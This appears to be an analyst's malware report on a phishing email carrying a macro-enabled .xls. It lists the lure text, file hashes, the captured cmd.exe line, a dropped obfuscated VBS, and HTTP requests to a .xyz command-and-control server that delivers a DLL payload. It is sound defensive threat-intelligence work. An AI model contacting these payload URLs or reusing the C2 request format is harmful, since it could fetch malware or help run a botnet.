THREAT IDENTIFICATION:  UNKNOWN MALWARE

ANALYST NOTES
The .xls file lists the following metadata: "Author: Mihail" and "Last Modified By: Архипов"."
After clicking the "Enable Content" button, I saw a UAC Prompt for "Windows Command Processor".
Clicking "Yes" displays a command window that reads: "Waiting for 10 seconds, press a key to continue".
The timer ticks down to zero and a wscript process is launched.
I really didn't see anything else from this sample except for a call to GitHub (possible a connectivity check).
This initial run was on a Windows 7 VM - I tried running it on a Windows 10 VM and got further along.
I found a .vbs file in a temporary folder that was named "ipconfig.vbs".
It's a heavily obfuscated script that's launched from the command line.
This time, after the GitHub callout, I saw several calls to a .xyz domain.
These calls were in the form of GET requests (initially) and then POST requests.
Looking through the .pcap file quickly made it clear that the GET requests downloaded the payload.
I pulled a file from the .pcap file that was a base64-encoded 32-bit .dll file named "avast_update".
The POST requests, then, would seem to be the C2 traffic.

SUBJECTS OBSERVED
Transfer act 10-04_1407  approved

SENDERS OBSERVED
daisysecretary.live <info@daisysecretary.live>

EMAIL BODY
We have processed the fund transfer for 129$ you’ve sent to Home Depot. Our accountants have already forwarded it to desired account.
All information about transfer 313451 you will find in the attached document.

MALDOC FILE HASH
payment_confirmation738.xls
cad6c0df000f4ff9c133ef06d3ff4ef0

CAPTURED COMMAND
"C:\windows\system32\cmd.exe" /c cd %TEMP% & TIMEOUT /T 10 & ipconfig

DROPPED VBS FILE HASH
ipconfig.vbs
3a60134873d06f5c84376992d60d7c1c
(This is written to disk in AppData\Local\Temp)

PAYLOAD DOWNLOAD GET REQUESTS
http://yiogqkksoyysqiky.xyz:1775/api/client_hello
http://yiogqkksoyysqiky.xyz:1775/avast_update
http://yiogqkksoyysqiky.xyz:1775/api/client_hello
http://yiogqkksoyysqiky.xyz:1775/api/client/new

EXAMPLE GET PACKET
GET /api/client_hello HTTP/1.1
Accept: */*
Connection: close
Host: yiogqkksoyysqiky.xyz:1775
User-Agent: cpp-httplib/0.10.1

HTTP/1.1 200 OK
Content-Length: 12
Content-Type: text/plain; charset=utf-8
Date: Thu, 28 Apr 2022 16:39:09 GMT
Server: nginx/1.10.3 (Ubuntu)
Vary: Origin
X-Request-Id: 040e81cc-e319-40ec-a85c-459ac3b9d054
Connection: close

{"ok":true}

DECODED EXECUTABLE FILE HASH
avast_update.exe
1cdd09da65f4a0a04123f6f5f4f52a9d

POST (C2) REQUESTS
http://yiogqkksoyysqiky.xyz:1775/tasks/get_worker

EXAMPLE POST PACKET
POST /tasks/get_worker HTTP/1.1
Accept: */*
Connection: close
Content-Length: 47
Content-Type: application/json
Host: yiogqkksoyysqiky.xyz:1775
User-Agent: cpp-httplib/0.10.1

{"uuid":"bbfe087d-95db-46d9-9ae1-73cb30f964d5"}HTTP/1.1 400 Bad Request
Content-Length: 17
Content-Type: text/plain; charset=utf-8
Date: Thu, 28 Apr 2022 16:39:11 GMT
Server: nginx/1.10.3 (Ubuntu)
Vary: Origin
X-Request-Id: faffe9d4-216c-4c59-b9a1-cbeb25e9c1f8
Connection: close

{"status":false}

STRINGS IN THE DLL FILE
C:\2\notbotnet\client\cryptopp\rijndael_simd.cpp
C:\2\notbotnet\client\cryptopp\gcm_simd.cpp
C:\2\notbotnet\client\cryptopp\sse_simd.cpp
C:\2\notbotnet\client\cryptopp\sha_simd.cpp
C:\2\notbotnet\client\cryptopp\gf2n_simd.cpp

SUPPORTING EVIDENCE
https://www.virustotal.com/gui/file/a4b217c10892be9ae8091344de83d85a24d781e28842b5498ee24165ccb0bdae






